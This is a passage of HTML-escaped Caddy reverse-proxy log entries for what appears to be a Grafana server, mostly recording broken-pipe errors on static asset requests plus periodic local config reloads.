response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000935686,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;222.195.81.117&quot;,&quot;remote_port&quot;:&quot;39236&quot;,&quot;client_ip&quot;:&quot;222.195.81.117&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-For&quot;:[&quot;222.195.81.117&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept-Language&quot;:[&quot;en-US,en;q=0.9&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;Accept&quot;:[&quot;*/*&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;222.195.81.117:39236: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472634.6801596,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000761164,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;222.195.81.117&quot;,&quot;remote_port&quot;:&quot;39286&quot;,&quot;client_ip&quot;:&quot;222.195.81.117&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-For&quot;:[&quot;222.195.81.117&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0&quot;],&quot;Accept-Language&quot;:[&quot;en-US,en;q=0.9&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;222.195.81.117:39286: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472697.068456,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.002940696,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;223.104.67.113&quot;,&quot;remote_port&quot;:&quot;2583&quot;,&quot;client_ip&quot;:&quot;223.104.67.113&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/grafana.dark.044d0c515b179d71f902.css&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Cookie&quot;:[&quot;REDACTED&quot;],&quot;X-Forwarded-For&quot;:[&quot;223.104.67.113&quot;],&quot;Accept&quot;:[&quot;text/css,*/*;q=0.1&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9&quot;],&quot;Dnt&quot;:[&quot;1&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;223.104.67.113:2583: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472767.7863948,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000739482,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;61.227.225.199&quot;,&quot;remote_port&quot;:&quot;27813&quot;,&quot;client_ip&quot;:&quot;61.227.225.199&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/6029.0549a3fcb50e73c4b256.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-For&quot;:[&quot;61.227.225.199&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;61.227.225.199:27813: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472769.899068,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001026682,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;61.227.225.199&quot;,&quot;remote_port&quot;:&quot;3259&quot;,&quot;client_ip&quot;:&quot;61.227.225.199&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/app.bbd213ecba15db924b4e.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;X-Forwarded-For&quot;:[&quot;61.227.225.199&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;61.227.225.199:3259: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472782.9393141,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000750977,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;61.227.225.199&quot;,&quot;remote_port&quot;:&quot;1911&quot;,&quot;client_ip&quot;:&quot;61.227.225.199&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-For&quot;:[&quot;61.227.225.199&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;61.227.225.199:1911: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773472783.3885572,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000891113,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;61.227.225.199&quot;,&quot;remote_port&quot;:&quot;12269&quot;,&quot;client_ip&quot;:&quot;61.227.225.199&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-For&quot;:[&quot;61.227.225.199&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;61.227.225.199:12269: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472791.7531729,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59790&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472791.7534142,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773472791.7534375,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773473062.3094783,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.024359651,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;38.207.136.135&quot;,&quot;remote_port&quot;:&quot;5501&quot;,&quot;client_ip&quot;:&quot;38.207.136.135&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/metrics&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;curl/8.17.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-For&quot;:[&quot;38.207.136.135&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;38.207.136.135:5501: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473091.7739272,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;59882&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473091.7741501,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473091.774173,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773473142.8003638,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000892123,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;220.248.177.28&quot;,&quot;remote_port&quot;:&quot;7509&quot;,&quot;client_ip&quot;:&quot;220.248.177.28&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Dnt&quot;:[&quot;1&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;X-Forwarded-For&quot;:[&quot;220.248.177.28&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;220.248.177.28:7509: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773473142.8843508,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000860704,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;220.248.177.28&quot;,&quot;remote_port&quot;:&quot;6055&quot;,&quot;client_ip&quot;:&quot;220.248.177.28&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/4570.87a4acc6d9144f9ee50a.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-For&quot;:[&quot;220.248.177.28&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Dnt&quot;:[&quot;1&quot;],&quot;Accept&quot;:[&quot;*/*&quot;]&#125;&#125;,&quot;error&quot;:&quot;reading: context canceled&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473391.795132,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;60012&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473391.7955527,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473391.7956004,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773473464.7520156,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.001599389,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;1.52.222.140&quot;,&quot;remote_port&quot;:&quot;55130&quot;,&quot;client_ip&quot;:&quot;1.52.222.140&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Sec-Ch-Ua&quot;:[&quot;\&quot;Google Chrome\&quot;;v=\&quot;143\&quot;, \&quot;Not=A?Brand\&quot;;v=\&quot;8\&quot;, \&quot;Chromium\&quot;;v=\&quot;143\&quot;&quot;],&quot;Accept-Language&quot;:[&quot;en-US;q=0.9,en;q=0.8&quot;],&quot;Cache-Control&quot;:[&quot;max-age=0&quot;],&quot;X-Forwarded-For&quot;:[&quot;1.52.222.140&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Sec-Ch-Ua-Mobile&quot;:[&quot;?0&quot;],&quot;Sec-Ch-Ua-Platform&quot;:[&quot;\&quot;macOS\&quot;&quot;],&quot;Sec-Fetch-Mode&quot;:[&quot;navigate&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate, br&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;Sec-Fetch-User&quot;:[&quot;?1&quot;],&quot;Sec-Fetch-Dest&quot;:[&quot;document&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot;],&quot;Sec-Fetch-Site&quot;:[&quot;none&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;1.52.222.140:55130: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473691.8255582,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;60142&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473691.82596,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473691.8259933,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473991.850983,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;60272&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473991.8512971,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773473991.8513243,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773474125.0178766,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000717933,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;36.231.107.200&quot;,&quot;remote_port&quot;:&quot;46324&quot;,&quot;client_ip&quot;:&quot;36.231.107.200&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/app.bbd213ecba15db924b4e.js&quot;,&quot;headers&quot;:&#123;&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;],&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-For&quot;:[&quot;36.231.107.200&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;36.231.107.200:46324: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773474125.280513,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000748214,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;36.231.107.200&quot;,&quot;remote_port&quot;:&quot;46348&quot;,&quot;client_ip&quot;:&quot;36.231.107.200&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/build/484.805ce326eee3d290c3d9.js&quot;,&quot;headers&quot;:&#123;&quot;Referer&quot;:[&quot;http://156.239.26.40:13334/login&quot;],&quot;X-Forwarded-For&quot;:[&quot;36.231.107.200&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;],&quot;User-Agent&quot;:[&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Accept-Encoding&quot;:[&quot;gzip, deflate&quot;],&quot;Accept-Language&quot;:[&quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;36.231.107.200:46348: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773474291.8723586,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;received request&quot;,&quot;method&quot;:&quot;POST&quot;,&quot;host&quot;:&quot;127.0.0.1:2019&quot;,&quot;uri&quot;:&quot;/load&quot;,&quot;remote_ip&quot;:&quot;127.0.0.1&quot;,&quot;remote_port&quot;:&quot;60418&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;Content-Length&quot;:[&quot;699&quot;],&quot;Content-Type&quot;:[&quot;application/json&quot;],&quot;User-Agent&quot;:[&quot;curl/7.81.0&quot;]&#125;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773474291.8726485,&quot;msg&quot;:&quot;config is unchanged&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;info&quot;,&quot;ts&quot;:1773474291.872678,&quot;logger&quot;:&quot;admin.api&quot;,&quot;msg&quot;:&quot;load complete&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773474433.8331056,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000723452,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;23.249.17.216&quot;,&quot;remote_port&quot;:&quot;16373&quot;,&quot;client_ip&quot;:&quot;23.249.17.216&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/api-merged.json&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;curl/8.18.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-For&quot;:[&quot;23.249.17.216&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;23.249.17.216:16373: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773474434.1823158,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete 